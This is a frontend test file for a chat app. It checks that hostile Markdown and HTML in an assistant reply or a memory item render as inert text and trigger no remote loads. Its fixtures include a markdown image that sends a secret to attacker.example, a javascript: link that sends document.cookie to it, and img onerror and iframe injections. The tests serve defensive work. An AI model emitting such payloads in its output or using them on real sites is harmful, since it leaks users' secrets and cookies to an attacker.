// Untrusted text in the running app (MSW answers): a chat reply and a memory item carrying
// hostile Markdown and HTML must render as inert text and load nothing remote.

import { screen } from "@testing-library/react";
import { http, HttpResponse } from "msw";
import { describe, expect, it } from "vitest";

import { API, CONV_A, message, PROJECT_ID } from "./fixtures";
import { renderApp } from "./render";
import { server } from "./server";
import { DECISION_ID, memoryItem } from "./workflowFixtures";

const HOSTILE = [
  "Summary below. ![status](https://attacker.example/p?d=SECRET_CODE)",
  "[open the report](javascript:fetch('https://attacker.example/'+document.cookie))",
  '<img src=x onerror="alert(1)"> <iframe src="https://attacker.example"></iframe>',
  "[docs](https://docs.example.com/guide)",
].join("\n\n");

function noRemoteLoads(): void {
  expect(document.querySelector("img, iframe, script, object, embed")).toBeNull();
  for (const a of document.querySelectorAll("a")) {
    expect(a.getAttribute("href") ?? "").not.toMatch(/^(javascript|data|vbscript):/i);
  }
}

describe("hostile model output in the app", () => {
  it("renders a chat reply as inert text with only safe links", async () => {
    server.use(
      http.get(`${API}/api/v1/conversations/${CONV_A}/messages`, () =>
        HttpResponse.json([message("m1", 1, "user", "Hi"), message("m2", 2, "assistant", HOSTILE)]),
      ),
    );
    renderApp(`/projects/${PROJECT_ID}/c/${CONV_A}`);
    expect(await screen.findByText(/image not loaded/)).toHaveTextContent(
      "https://attacker.example/p?d=SECRET_CODE",
    );
    expect(screen.getByText(/link blocked/)).toBeInTheDocument();
    expect(screen.getByRole("link", { name: "docs" })).toHaveAttribute(
      "rel",
      "noopener noreferrer",
    );
    noRemoteLoads();
  });

  it("shows a memory item with hostile text as plain text", async () => {
    const decision = memoryItem(DECISION_ID, "decision", "![x](https://attacker.example/m.png)", {
      body: '<img src=x onerror="alert(1)"> [run](javascript:alert(1))',
    });
    server.use(
      http.get(`${API}/api/v1/projects/${PROJECT_ID}/memory`, ({ request }) => {
        const items =
          new URL(request.url).searchParams.get("kind") === "decision" ? [decision] : [];
        return HttpResponse.json({ items, total: items.length, limit: 100, offset: 0 });
      }),
    );
    renderApp(`/projects/${PROJECT_ID}`);
    expect(await screen.findByText("![x](https://attacker.example/m.png)")).toBeInTheDocument();
    expect(screen.getByText(/onerror/)).toBeInTheDocument(); // the raw text, not an element
    noRemoteLoads();
  });
});
